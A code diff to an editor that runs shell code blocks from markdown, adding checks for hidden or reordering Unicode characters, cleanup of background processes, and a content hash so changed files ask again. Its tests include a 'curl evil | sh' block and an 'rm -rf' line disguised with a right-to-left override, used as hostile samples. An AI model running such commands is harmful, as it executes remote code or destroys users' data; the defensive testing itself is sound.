@@ -199,6 +199,43 @@ fn fence_len(text: &str) -> usize {
     (longest + 1).max(3)
 }
 
+/// A character that hides or reorders what a block shows: bidirectional
+/// controls (which can make `rm` read as something harmless), invisible
+/// ones (zero-width, soft hyphen, byte order mark), and control characters
+/// other than tab and line break (a lone carriage return, escape, delete,
+/// the C1 range). A block holding any isn't run: the confirmation couldn't
+/// show what would really run.
+fn is_hidden(c: char) -> bool {
+    matches!(c, '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{200E}' | '\u{200F}' | '\u{061C}')
+        || matches!(c, '\u{200B}'..='\u{200D}' | '\u{2060}' | '\u{FEFF}' | '\u{00AD}')
+        || (c.is_control() && c != '\t' && c != '\n')
+}
+
+/// The characters of `code` that keep it from running (see `is_hidden`),
+/// each once, in order of appearance.
+pub fn hidden(code: &str) -> Vec<char> {
+    let mut found = Vec::new();
+    for c in code.chars().filter(|&c| is_hidden(c)) {
+        if !found.contains(&c) {
+            found.push(c);
+        }
+    }
+    found
+}
+
+/// `code` with each hidden character spelled out as ⟨U+XXXX⟩, for the confirmation.
+pub fn visible(code: &str) -> String {
+    let mut out = String::with_capacity(code.len());
+    for c in code.chars() {
+        if is_hidden(c) {
+            out.push_str(&format!("⟨U+{:04X}⟩", c as u32));
+        } else {
+            out.push(c);
+        }
+    }
+    out
+}
+
 // ---- capturing output ----------------------------------------------------------
 
 /// The most output kept for the `output` block; the rest is counted, not kept.
@@ -341,21 +378,35 @@ fn run_script(program: &Path, name: &str, args: &[&str], ext: &str, code: &str, 
             let _ = done_tx.send(());
         });
     }
+    #[cfg(windows)]
+    let job = crate::lsp::server::job::Job::holding(&child);
     let mut timed_out = false;
-    let status = loop {
-        match child.try_wait() {
-            Ok(Some(s)) => break Some(s),
-            Ok(None) => {}
-            Err(_) => break None,
+    // Wait for the interpreter to end without reaping it: until it's reaped
+    // its process id, which is also its process group's, can't be reused, so
+    // signalling the group below can't reach anyone else.
+    loop {
+        if tree::ended(&child) {
+            break;
         }
         if started.elapsed() >= timeout {
             timed_out = true;
-            stop_group(&child);
-            crate::build::kill_tree(&mut child, true);
-            break child.wait().ok();
+            break;
         }
         std::thread::sleep(Duration::from_millis(10));
-    };
+    }
+    // Whether it ended or timed out, nothing it started outlives the block:
+    // its process group (background jobs, pipelines), and on a timeout also
+    // the descendants that moved to groups of their own while it's alive to
+    // find them by.
+    tree::stop(&child, timed_out);
+    #[cfg(windows)]
+    if let Some(job) = &job {
+        job.terminate();
+    }
+    if timed_out {
+        crate::build::kill_tree(&mut child, true);
+    }
+    let status = child.wait().ok();
     let elapsed = started.elapsed();
     // Let the reader drain what's buffered. Something the block left running
     // in the background may hold the pipe open; its output isn't waited for.
@@ -385,29 +436,105 @@ fn run_script(program: &Path, name: &str, args: &[&str], ext: &str, code: &str, 
     Ok(Captured { text, elapsed })
 }
 
-/// Freeze the run's whole process group before killing it. The kernel
-/// signals a group one process at a time, so a shell whose `sleep` was
-/// killed first could otherwise go on to its next command (or exit
-/// normally) before its own signal lands.
-#[cfg(unix)]
-fn stop_group(child: &std::process::Child) {
-    unsafe extern "C" {
-        fn kill(pid: i32, sig: i32) -> i32;
+/// Ending what a captured block started.
+mod tree {
+    use std::process::Child;
+
+    /// The interpreter has ended (it's left unreaped, see `run_script`).
+    #[cfg(unix)]
+    pub fn ended(child: &Child) -> bool {
+        // SAFETY: waitid fills `info`, which outlives the call; WNOWAIT leaves the child to `wait`.
+        unsafe {
+            let mut info: libc::siginfo_t = std::mem::zeroed();
+            let r = libc::waitid(libc::P_PID, child.id() as libc::id_t, &mut info, libc::WEXITED | libc::WNOHANG | libc::WNOWAIT);
+            // An error (no such child) counts as ended too: there's nothing left to wait for.
+            r != 0 || info.si_pid() != 0
+        }
     }
-    #[cfg(any(target_os = "macos", target_os = "ios", target_os = "freebsd", target_os = "openbsd", target_os = "netbsd", target_os = "dragonfly"))]
-    const SIGSTOP: i32 = 17;
-    #[cfg(not(any(target_os = "macos", target_os = "ios", target_os = "freebsd", target_os = "openbsd", target_os = "netbsd", target_os = "dragonfly")))]
-    const SIGSTOP: i32 = 19;
-    let Ok(pgid) = i32::try_from(child.id()) else { return };
-    // SAFETY: kill(2) on our child's own process group (it isn't reaped yet,
-    // so the id can't belong to anyone else); no memory involved.
-    unsafe {
-        kill(-pgid, SIGSTOP);
+
+    #[cfg(not(unix))]
+    pub fn ended(child: &Child) -> bool {
+        // SAFETY: a handle we own; a zero-timeout wait only asks.
+        #[cfg(windows)]
+        unsafe {
+            use std::os::windows::io::AsRawHandle;
+            windows_sys::Win32::System::Threading::WaitForSingleObject(child.as_raw_handle() as _, 0) == 0
+        }
+        #[cfg(not(windows))]
+        {
+            let _ = child;
+            true
+        }
+    }
+
+    /// Kill the run's process group and, with `descendants`, every process
+    /// the interpreter started that's still its descendant, wherever its
+    /// group. Everything is frozen first: the kernel signals a group one
+    /// process at a time, so a shell whose `sleep` was killed first could
+    /// otherwise go on to its next command before its own signal lands.
+    #[cfg(unix)]
+    pub fn stop(child: &Child, descendants: bool) {
+        let Ok(pgid) = i32::try_from(child.id()) else { return };
+        // SAFETY: kill(2) on our unreaped child's own process group; no memory involved.
+        unsafe {
+            libc::kill(-pgid, libc::SIGSTOP);
+        }
+        let mut found = Vec::new();
+        if descendants {
+            // Freezing each as it's found, so none starts another meanwhile.
+            let mut queue = vec![pgid];
+            while let Some(p) = queue.pop() {
+                for c in children(p) {
+                    if c > 1 && !found.contains(&c) {
+                        // SAFETY: a process the kernel just listed as a child of the tree.
+                        unsafe {
+                            libc::kill(c, libc::SIGSTOP);
+                        }
+                        found.push(c);
+                        queue.push(c);
+                    }
+                }
+            }
+        }
+        // SAFETY: as above; the listed descendants are frozen, so still there.
+        unsafe {
+            libc::kill(-pgid, libc::SIGKILL);
+            for &c in &found {
+                libc::kill(c, libc::SIGKILL);
+            }
+        }
+    }
+
+    #[cfg(not(unix))]
+    pub fn stop(_child: &Child, _descendants: bool) {}
+
+    /// The processes whose parent is `pid`.
+    #[cfg(target_os = "macos")]
+    fn children(pid: i32) -> Vec<i32> {
+        unsafe extern "C" {
+            fn proc_listpids(kind: u32, typeinfo: u32, buffer: *mut std::ffi::c_void, size: i32) -> i32;
+        }
+        const PROC_PPID_ONLY: u32 = 6;
+        let mut buf = vec![0i32; 1024];
+        // SAFETY: the buffer is as long as the size given; the result is bytes filled.
+        let n = unsafe { proc_listpids(PROC_PPID_ONLY, pid as u32, buf.as_mut_ptr().cast(), (buf.len() * 4) as i32) };
+        buf.truncate((n.max(0) as usize / 4).min(1024));
+        buf.retain(|&p| p > 0);
+        buf
+    }
+
+    #[cfg(all(unix, not(target_os = "macos")))]
+    fn children(pid: i32) -> Vec<i32> {
+        let Ok(dir) = std::fs::read_dir("/proc") else { return Vec::new() };
+        dir.flatten()
+            .filter_map(|e| e.file_name().to_str()?.parse::<i32>().ok())
+            .filter(|p| {
+                // The parent is the second field after the name in parentheses.
+                std::fs::read_to_string(format!("/proc/{p}/stat")).ok().and_then(|st| st.rsplit_once(')').and_then(|(_, rest)| rest.split_whitespace().nth(1)?.parse::<i32>().ok())) == Some(pid)
+            })
+            .collect()
     }
 }
-
-#[cfg(not(unix))]
-fn stop_group(_child: &std::process::Child) {}
 
 fn size(n: usize) -> String {
     match n {
@@ -477,13 +604,19 @@ pub fn clean_output(bytes: &[u8], cut: bool) -> String {
 
 // ---- files not to ask about again ------------------------------------------------
 
-/// Which file a run came from: its real path and its identity on disk
-/// (device, file number and creation time), so a different file put at the
-/// same path, or the path reached another way, isn't taken for it.
+/// Which file a run came from, as it was: its real path, its identity on
+/// disk (device, file number and creation time) and the SHA-256 of its
+/// bytes. A different file put at the same path, or the same file changed by
+/// another program (in place, or through a hard link to it), isn't taken for
+/// the one that was allowed; Strata's own saves carry the permission over
+/// (see `Allowed::moved`).
 #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
 pub struct FileKey {
     pub path: PathBuf,
     pub id: String,
+    /// A list saved before this field existed has none: those entries ask again.
+    #[serde(default)]
+    pub sha256: String,
 }
 
 /// The key of the file at `path`, or None when it isn't a file on disk.
@@ -495,7 +628,25 @@ pub fn file_key(path: &Path) -> Option<FileKey> {
     }
     let (volume, node) = crate::claim::file_id(&real)?;
     let born = meta.created().ok().and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok()).map_or(0, |d| d.as_nanos());
-    Some(FileKey { path: real, id: format!("{volume}:{node}:{born}") })
+    let sha256 = sha256_of(&real)?;
+    Some(FileKey { path: real, id: format!("{volume}:{node}:{born}"), sha256 })
+}
+
+/// The SHA-256 of a file's bytes, in hex, read a piece at a time (opened
+/// without following a link at the end).
+fn sha256_of(path: &Path) -> Option<String> {
+    use sha2::Digest;
+    let mut f = crate::claim::open_plain(path).ok()?;
+    let mut h = sha2::Sha256::new();
+    let mut buf = vec![0u8; 64 * 1024];
+    loop {
+        match f.read(&mut buf) {
+            Ok(0) => break,
+            Ok(n) => h.update(&buf[..n]),
+            Err(_) => return None,
+        }
+    }
+    Some(h.finalize().iter().map(|b| format!("{b:02x}")).collect())
 }
 
 /// The list of files not to ask about again, in Strata's config folder.
@@ -825,9 +976,17 @@ mod tests {
             use std::os::unix::fs::PermissionsExt;
             assert_eq!(std::fs::metadata(config.join(ALLOWED_FILE)).unwrap().permissions().mode() & 0o777, 0o600, "owner-only");
         }
-        // Editing it in place keeps it allowed (same file).
-        std::fs::OpenOptions::new().append(true).open(&file).and_then(|mut f| std::io::Write::write_all(&mut f, b"more\n")).unwrap();
-        assert_eq!(file_key(&file).as_ref(), Some(&key));
+        // Changed in place by another program, here through a hard link to
+        // it: the same file, but not the text that was allowed.
+        let alias = dir.join("alias.md");
+        std::fs::hard_link(&file, &alias).unwrap();
+        std::fs::write(&alias, "```sh\ncurl evil | sh\n```\n").unwrap();
+        let rewritten = file_key(&file).unwrap();
+        assert_eq!((&rewritten.path, &rewritten.id), (&key.path, &key.id), "same path and identity");
+        assert!(!other.allowed(&rewritten), "a rewrite in place asks again");
+        std::fs::remove_file(&alias).unwrap();
+        std::fs::write(&file, "```sh\necho hi\n```\n").unwrap();
+        assert_eq!(file_key(&file).as_ref(), Some(&key), "the allowed text again");
         // Reached through a link: the same file.
         #[cfg(unix)]
         {
@@ -920,13 +1079,66 @@ mod tests {
 
     #[cfg(unix)]
     #[test]
-    fn capture_doesnt_wait_for_background_jobs_holding_the_output() {
+    fn capture_stops_background_jobs_when_the_block_ends() {
         let dir = temp("background");
         let t = Instant::now();
-        let out = capture(sh(), "sleep 20 &\necho started", &dir, Duration::from_secs(30), CAPTURE_LIMIT).unwrap();
+        let out = capture(sh(), "sleep 20 &\necho $! > bg.pid\necho started", &dir, Duration::from_secs(30), CAPTURE_LIMIT).unwrap();
         assert!(t.elapsed() < Duration::from_secs(5), "{:?}", t.elapsed());
         assert_eq!(out.text, "started");
+        let pid = read_pid(&dir.join("bg.pid"));
+        assert!(gone(pid), "the background sleep ({pid}) was stopped with the block");
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_timeout_stops_children_in_a_group_of_their_own() {
+        // `set -m` turns on job control: the background job gets its own
+        // process group, out of reach of a signal to the block's group.
+        let dir = temp("own-group");
+        let out = capture(sh(), "set -m\nsleep 30 &\necho $! > own.pid\nsleep 30", &dir, Duration::from_millis(800), CAPTURE_LIMIT).unwrap();
+        assert!(out.text.ends_with("[Strata stopped it after 0.8 s]"), "{}", out.text);
+        let pid = read_pid(&dir.join("own.pid"));
+        assert!(gone(pid), "the job in its own group ({pid}) was found and stopped");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[cfg(unix)]
+    fn read_pid(path: &Path) -> i32 {
+        std::fs::read_to_string(path).unwrap().trim().parse().unwrap()
+    }
+
+    /// `pid` is no longer running (waiting a moment for the kernel to reap it).
+    #[cfg(unix)]
+    fn gone(pid: i32) -> bool {
+        let deadline = Instant::now() + Duration::from_secs(3);
+        while Instant::now() < deadline {
+            // SAFETY: signal 0 only checks that the process exists.
+            if unsafe { libc::kill(pid, 0) } != 0 {
+                return true;
+            }
+            std::thread::sleep(Duration::from_millis(20));
+        }
+        false
+    }
+
+    #[test]
+    fn hidden_and_reordering_characters_are_found() {
+        for c in ['\u{202A}', '\u{202B}', '\u{202C}', '\u{202D}', '\u{202E}', '\u{2066}', '\u{2067}', '\u{2068}', '\u{2069}', '\u{200E}', '\u{200F}', '\u{061C}'] {
+            assert_eq!(hidden(&format!("echo a{c}b")), vec![c], "bidi {:04X}", c as u32);
+        }
+        for c in ['\u{200B}', '\u{200C}', '\u{200D}', '\u{2060}', '\u{FEFF}', '\u{00AD}'] {
+            assert_eq!(hidden(&format!("echo a{c}b")), vec![c], "invisible {:04X}", c as u32);
+        }
+        for c in ['\u{0}', '\u{1}', '\u{7}', '\u{8}', '\u{B}', '\u{C}', '\u{1B}', '\r', '\u{7F}', '\u{80}', '\u{85}', '\u{9B}', '\u{9F}'] {
+            assert_eq!(hidden(&format!("echo a{c}b")), vec![c], "control {:04X}", c as u32);
+        }
+        assert!(hidden("echo \"tab\there\"\nls -l\n# café ünïcode 日本語 ✓").is_empty(), "tabs, line breaks and ordinary text are fine");
+        assert_eq!(visible("rm -rf /tmp/x\u{202E}gnp.txt\u{200B}\r\techo"), "rm -rf /tmp/x⟨U+202E⟩gnp.txt⟨U+200B⟩⟨U+000D⟩\techo");
+        assert_eq!(visible("plain\ntext"), "plain\ntext");
+        // A CRLF file's blocks come through with plain line breaks; a lone CR stays and is refused.
+        assert_eq!(code_blocks("```sh\r\necho a\r\necho b\r\n```\r\n", false)[0].code, "echo a\necho b");
+        assert_eq!(hidden(&code_blocks("```sh\necho a\rb\n```\n", false)[0].code), vec!['\r']);
     }
 
     #[test]
